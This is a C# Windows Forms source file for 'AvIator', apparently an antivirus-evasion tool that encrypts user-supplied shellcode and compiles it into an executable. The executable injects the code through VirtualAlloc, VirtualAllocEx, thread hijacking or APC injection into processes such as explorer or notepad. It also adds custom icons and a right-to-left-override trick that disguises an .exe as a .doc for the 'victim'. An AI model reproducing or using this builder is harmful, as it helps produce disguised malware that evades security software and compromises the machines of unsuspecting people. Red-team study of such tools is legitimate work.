using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace AvIator
{



    public partial class Form1 : Form
    {
        [DllImport("shell32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.Winapi)]
        private static extern int PickIconDlg(IntPtr hwndOwner, System.Text.StringBuilder lpstrFile, int nMaxFile, ref int lpdwIconIndex);

        private String filepath;

        string iconfile; 

        public Form1()
        {
            InitializeComponent();
        }

        private void buton1_click(object sender, EventArgs e)
        {
            

            String[] initKey = keyBox.Text.Split(',');
            Byte[] initKeyB = hexStrToByteArray(initKey);

            String[] initIv = ivBox.Text.Split(',');
            Byte[] initIvB = hexStrToByteArray(initIv);

            String[] initPayload = ((payloadBox.Text).Replace("\r\n","")).Split(',');
            Byte[] initPayloadB = hexStrToByteArray(initPayload);

            Byte[] result = Encrypt.Encryption_Class.Encrypt(initKeyB, initPayloadB);

            String res = null;

            for (int i = 0; i < result.Length; i++)
            {
                
                if (i == result.Length-1)
                { res += result[i].ToString(); }
                else
                { res+=result[i].ToString() + ","; }
            }
            resultBox.Text = res;
        }


        private Byte[] hexStrToByteArray(String [] hexStr)
        {
            int i = 0;
            Byte[] tmp = new byte[hexStr.Length];

            foreach(String bt in hexStr)
            {
                tmp[i++] = Convert.ToByte(bt.Substring(2, 2), 16);
            }
            return tmp;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            String architecture = null;
            Compiler compiler = new Compiler();
            ThreadHijackingX86 thrHijackingx86 = null;
            ThreadHijacking thrHijacking = null;
            VirtualAllocTech virtualAllocT = null;
            VirtualAllocExTech virtualAllocExT = null;
            VirtualAllocEx_existing_APP_Tech virtualAllocEx_existing = null;
            APCInjecionX64 apcInjectionX64 = null;

            if (archX64.Checked)
                architecture = " /platform:x64 /optimize";
            else
                architecture = " /platform:x86 /optimize";

            if(iconfile != null)
                architecture += " /win32icon:" + iconfile;
            try
            {
                if (virtualAlloc_Option.Checked)
                {
                    virtualAllocT = new VirtualAllocTech(keyBox.Text, resultBox.Text.Replace("\r\n", ""));
                    compiler.compileToExe(virtualAllocT.GetCode(), keyBox.Text, filepath, architecture);
                }
                else
                    if (virtualAllocEx_Option.Checked)
                {
                    procBox.Text = "notepad.exe (32)";
                    virtualAllocExT = new VirtualAllocExTech(keyBox.Text, resultBox.Text.Replace("\r\n", ""),procBox.Text);
                    compiler.compileToExe(virtualAllocExT.GetCode(), keyBox.Text, filepath, architecture);
                }
                else if (injectExistingApp.Checked)
                {
                    procBox.Enabled = true;
                    virtualAllocEx_existing = new VirtualAllocEx_existing_APP_Tech(keyBox.Text, resultBox.Text.Replace("\r\n", ""), procBox.Text);
                    compiler.compileToExe(virtualAllocEx_existing.GetCode(), keyBox.Text, filepath, architecture);
                }
                else if (threadHijacking_option.Checked)
                {

                    thrHijacking = new ThreadHijacking(keyBox.Text, resultBox.Text.Replace("\r\n", ""),procBox.Text);
                    compiler.compileToExe(thrHijacking.GetCode(), keyBox.Text, filepath, architecture);
                }
                else if(threadHijackin_x86.Checked)
                {
                    procBox.Enabled = false;
                    procBox.Text = "notepad.exe (32)";
                    thrHijackingx86 = new ThreadHijackingX86(keyBox.Text, resultBox.Text.Replace("\r\n", ""), procBox.Text);
                    compiler.compileToExe(thrHijackingx86.GetCode(), keyBox.Text, filepath, architecture);


                }
                else if (APCInjectionCheckBox.Checked)
                {
                    procBox.Enabled = true;
                    apcInjectionX64 = new APCInjecionX64(keyBox.Text, resultBox.Text.Replace("\r\n", ""), procBox.Text);
                    compiler.compileToExe(apcInjectionX64.GetCode(), keyBox.Text, filepath, architecture);

                }
                MessageBox.Show("The operation completed successfully", "AV/\tor");
                iconfile = null;
            }

            catch (Exception er)
            {
                MessageBox.Show(er.Message);
            }

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            LinkLabel.Link link = new LinkLabel.Link();
            link.LinkData = "https://twitter.com/Ch0pin";
            linkLabel1.Links.Add(link);
            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            genExe.Enabled = false;
            RTLOtip.SetToolTip(RTLOCheckBox, "RIGHT TO LEFT OVERRIDE is a Unicode mainly used for the writing and the reading of Arabic or Hebrew text.\n " +
                "It is used to disguise the names of files. For example the file testcod.exe will be displayed to the victim as testexe.doc");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string filename;
            label8.Text = "Path:";
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();

            saveFileDialog1.Filter = "exe files (*.exe)|*.exe";
            saveFileDialog1.FilterIndex = 2;
            saveFileDialog1.RestoreDirectory = true;

            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                if (RTLOCheckBox.Checked)
                {
                    string tmp = saveFileDialog1.FileName;
                    int i = tmp.LastIndexOf('.') - 4;

                    string rtlo = "\x202e";

                    filename = tmp.Substring(0, i+1) + rtlo + tmp.Substring(i+1);

                }
                else filename = saveFileDialog1.FileName;

                label8.Text += filename;
                filepath = filename;
                genExe.Enabled = true;
            }

        }

        private void virtualAllocEx_Option_CheckedChanged(object sender, EventArgs e)
        {
            archX86.Checked = true;
            if (virtualAllocEx_Option.Checked)
                procBox.Text = "notepad.exe (32)";
            else if (virtualAlloc_Option.Checked)
                procBox.Text = "none";
            procBox.Enabled = false;
        }

        private void threadHijacking_option_CheckedChanged(object sender, EventArgs e)
        {
            archX64.Checked = true;
            procBox.Text = "explorer";
            procBox.Enabled = true;
        }

        private void injectExistingApp_CheckedChanged(object sender, EventArgs e)
        {
            procBox.Text = "explorer";
            procBox.Enabled = true;
        }

        private void threadHijackin_x86_CheckedChanged(object sender, EventArgs e)
        {
            archX86.Checked = true;
            procBox.Text = "notepad.exe (32)";
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void groupBox4_Enter(object sender, EventArgs e)
        {

        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start(e.Link.LinkData as string);
        }

        private void button2_Click_1(object sender, EventArgs e)
        {

            OpenFileDialog openFileDlg = new OpenFileDialog();
            openFileDlg.Title = "Choose a custom icon";

            openFileDlg.Filter = "icon files (*.ico)|*.ico";
            if (openFileDlg.ShowDialog() == DialogResult.OK)
                iconfile = openFileDlg.FileName;


        }

        private void APCInjectionCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            archX64.Checked = true;
            procBox.Text = "explorer";
            procBox.Enabled = true;
        }
    }
}
